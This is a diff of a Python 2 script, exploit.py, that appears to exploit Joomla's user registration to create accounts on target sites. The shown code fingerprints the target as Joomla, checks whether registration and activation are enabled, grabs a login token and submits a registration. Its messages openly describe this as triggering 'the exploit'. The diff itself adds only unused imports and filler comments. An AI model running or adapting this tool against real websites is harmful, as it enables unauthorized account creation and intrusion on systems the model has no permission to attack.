@@ -6,8 +6,11 @@
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from requests_toolbelt.multipart.encoder import MultipartEncoder
+import webbrowser
 import requests
+import os.path
 import sys
+import os
 import re
 
 urlPattern = 0
@@ -19,6 +22,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 session = requests.session()
 session.headers.update({"User-Agent":"Mozilla/5.0"})
 
+# create def main():
 def main():
 	if len(sys.argv) <= 1:
 		print "specifiy the target: exploit.py https://site.com"
@@ -30,6 +34,7 @@ def main():
 	regenabled(site)
 	register(site)
 
+# create def isJoomla(site):
 def isJoomla(site):
 	print "checking if website is joomla-based"
 	r = session.get(site + "/robots.txt", verify=False, allow_redirects=False)
@@ -48,6 +53,7 @@ def isJoomla(site):
 		print "website doesn't seem joomla-based"
 		sys.exit()
 
+# create def regenabled(site, ptrn1 = True):
 def regenabled(site, ptrn1 = True):
 	 cr1 = '/index.php/component/users/?task=registration.activate&token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
 	 cr2 = '/component/users/?task=registration.activate&token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
@@ -64,7 +70,7 @@ def regenabled(site, ptrn1 = True):
 	 if r.status_code == 403:
 	 	print 'registration/activation is disabled; even if we trigger the exploit\nthe created account cannot be activated later which is useless'
 	 	sys.exit()
-
+# create def token(site):
 def token(site):
 	vl1 = '/index.php?option=com_users&view=login'
 	vl2 = '/component/users/?view=login'
@@ -140,4 +146,4 @@ def register(site):
 		print 'finished now you can check the raw response "output.html" and your email\nfor confirmation link to make sure whether successfully exploited (cause im too lazy)'
 	#print(format('\n'.join('{}: {}'.format(k, v) for k, v in r.headers.items())))
 
-main()
+main() # exit()
